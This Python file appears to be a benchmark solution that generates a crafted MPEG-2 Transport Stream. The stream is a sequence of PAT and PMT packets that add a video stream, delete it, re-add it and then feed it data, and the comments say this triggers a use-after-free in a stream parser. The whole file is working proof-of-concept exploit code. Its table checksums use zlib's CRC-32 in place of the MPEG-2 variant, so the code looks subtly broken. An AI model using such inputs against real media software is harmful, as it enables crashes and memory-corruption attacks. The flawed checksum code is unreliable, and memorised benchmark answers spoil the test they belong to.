import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        PID_PAT = 0x0000
        PID_PMT = 0x0100
        PID_ES = 0x0101
        TS_PACKET_SIZE = 188
        TS_SYNC_BYTE = 0x47

        cc = {
            PID_PAT: 0,
            PID_PMT: 0,
            PID_ES: 0
        }

        def make_ts_packet(pid: int, payload: bytes, pusi: int) -> bytes:
            """Creates a 188-byte MPEG-2 Transport Stream packet."""
            header = bytearray(4)
            header[0] = TS_SYNC_BYTE
            # TEI=0, PUSI, Priority=0, PID high bits
            header[1] = (pusi << 6) | ((pid >> 8) & 0x1F)
            # PID low bits
            header[2] = pid & 0xFF
            # TSC=0, AdaptationField=payload_only (0b01), Continuity Counter
            header[3] = 0x10 | (cc[pid] & 0x0F)
            
            cc[pid] = (cc[pid] + 1) % 16

            padding_size = TS_PACKET_SIZE - 4 - len(payload)
            if padding_size < 0:
                raise ValueError("Payload too large for a TS packet")
            
            return bytes(header) + payload + bytes([0xFF] * padding_size)

        poc_data = bytearray()

        # Packet 1: Program Association Table (PAT)
        # Defines Program 1, mapping it to PMT at PID_PMT.
        pat_section_data = bytes.fromhex('00B00D0001C100000001E100')
        pat_crc = zlib.crc32(pat_section_data).to_bytes(4, 'big')
        pat_payload = b'\x00' + pat_section_data + pat_crc
        poc_data += make_ts_packet(PID_PAT, pat_payload, pusi=1)

        # Packet 2: Program Map Table (PMT), Version 1
        # Defines an elementary stream (H.264) with PID_ES for Program 1.
        pmt1_section_data = bytes.fromhex('02B0120001C10000FFFFF0001BE101F000')
        pmt1_crc = zlib.crc32(pmt1_section_data).to_bytes(4, 'big')
        pmt1_payload = b'\x00' + pmt1_section_data + pmt1_crc
        poc_data += make_ts_packet(PID_PMT, pmt1_payload, pusi=1)
        
        # Packet 3: Elementary Stream Data
        # Send data for the new stream to ensure it is initialized.
        es_payload1 = b'\x00\x00\x01\xe0\x00\x00' + b'\x41' * (TS_PACKET_SIZE - 4 - 6)
        poc_data += make_ts_packet(PID_ES, es_payload1, pusi=1)

        # Packet 4: Program Map Table (PMT), Version 2
        # Update PMT with an empty stream loop, signaling deletion of the ES.
        # This causes the 'free' part of the use-after-free.
        pmt2_section_data = bytes.fromhex('02B00D0001C30000FFFFF000')
        pmt2_crc = zlib.crc32(pmt2_section_data).to_bytes(4, 'big')
        pmt2_payload = b'\x00' + pmt2_section_data + pmt2_crc
        poc_data += make_ts_packet(PID_PMT, pmt2_payload, pusi=1)
        
        # Packet 5: Program Map Table (PMT), Version 3
        # Re-add the same elementary stream, causing a new allocation.
        # The vulnerable code might still hold a pointer to the old, freed memory.
        pmt3_section_data = bytes.fromhex('02B0120001C50000FFFFF0001BE101F000')
        pmt3_crc = zlib.crc32(pmt3_section_data).to_bytes(4, 'big')
        pmt3_payload = b'\x00' + pmt3_section_data + pmt3_crc
        poc_data += make_ts_packet(PID_PMT, pmt3_payload, pusi=1)
        
        # Packet 6: Elementary Stream Data (Trigger)
        # Send more data for the stream. Processing this data will use the
        # dangling pointer, triggering the crash.
        es_payload2 = b'\x42' * (TS_PACKET_SIZE - 4)
        poc_data += make_ts_packet(PID_ES, es_payload2, pusi=0)
        
        return bytes(poc_data)